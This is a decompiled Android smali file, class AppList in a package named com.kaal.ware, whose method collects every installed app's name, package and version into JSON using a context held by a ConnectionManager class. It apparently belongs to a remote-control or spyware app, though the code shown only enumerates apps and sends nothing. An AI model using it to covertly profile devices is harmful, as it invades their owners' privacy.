.class public Lcom/kaal/ware/AppList;
.super Ljava/lang/Object;
.source "AppList.java"


# direct methods
.method public constructor <init>()V
    .registers 1

    .line 14
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getInstalledApps(Z)Lorg/json/JSONObject;
    .registers 11
    .param p0, "getSysPackages"    # Z

    .line 18
    new-instance v0, Lorg/json/JSONArray;

    invoke-direct {v0}, Lorg/json/JSONArray;-><init>()V

    .line 20
    .local v0, "apps":Lorg/json/JSONArray;
    sget-object v1, Lcom/kaal/ware/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v1

    .line 22
    .local v1, "packs":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_11
    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v3

    if-ge v2, v3, :cond_5c

    .line 23
    invoke-interface {v1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/content/pm/PackageInfo;

    .line 24
    .local v3, "p":Landroid/content/pm/PackageInfo;
    if-nez p0, :cond_24

    iget-object v4, v3, Landroid/content/pm/PackageInfo;->versionName:Ljava/lang/String;

    if-nez v4, :cond_24

    .line 25
    goto :goto_59

    .line 28
    :cond_24
    :try_start_24
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 29
    .local v4, "newInfo":Lorg/json/JSONObject;
    iget-object v5, v3, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    sget-object v6, Lcom/kaal/ware/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v6}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v6

    invoke-virtual {v5, v6}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v5

    invoke-interface {v5}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v5

    .line 30
    .local v5, "appname":Ljava/lang/String;
    iget-object v6, v3, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    .line 31
    .local v6, "pname":Ljava/lang/String;
    iget-object v7, v3, Landroid/content/pm/PackageInfo;->versionName:Ljava/lang/String;

    .line 32
    .local v7, "versionName":Ljava/lang/String;
    iget v8, v3, Landroid/content/pm/PackageInfo;->versionCode:I

    .line 34
    .local v8, "versionCode":I
    const-string v9, "appName"

    invoke-virtual {v4, v9, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 35
    const-string v9, "packageName"

    invoke-virtual {v4, v9, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 36
    const-string v9, "versionName"

    invoke-virtual {v4, v9, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 37
    const-string v9, "versionCode"

    invoke-virtual {v4, v9, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 38
    invoke-virtual {v0, v4}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_56
    .catch Lorg/json/JSONException; {:try_start_24 .. :try_end_56} :catch_58

    .line 39
    nop

    .end local v4    # "newInfo":Lorg/json/JSONObject;
    .end local v5    # "appname":Ljava/lang/String;
    .end local v6    # "pname":Ljava/lang/String;
    .end local v7    # "versionName":Ljava/lang/String;
    .end local v8    # "versionCode":I
    goto :goto_59

    :catch_58
    move-exception v4

    .line 22
    .end local v3    # "p":Landroid/content/pm/PackageInfo;
    :goto_59
    add-int/lit8 v2, v2, 0x1

    goto :goto_11

    .line 42
    .end local v2    # "i":I
    :cond_5c
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 44
    .local v2, "data":Lorg/json/JSONObject;
    :try_start_61
    const-string v3, "apps"

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_66
    .catch Lorg/json/JSONException; {:try_start_61 .. :try_end_66} :catch_67

    goto :goto_68

    .line 45
    :catch_67
    move-exception v3

    :goto_68
    nop

    .line 47
    return-object v2
.end method
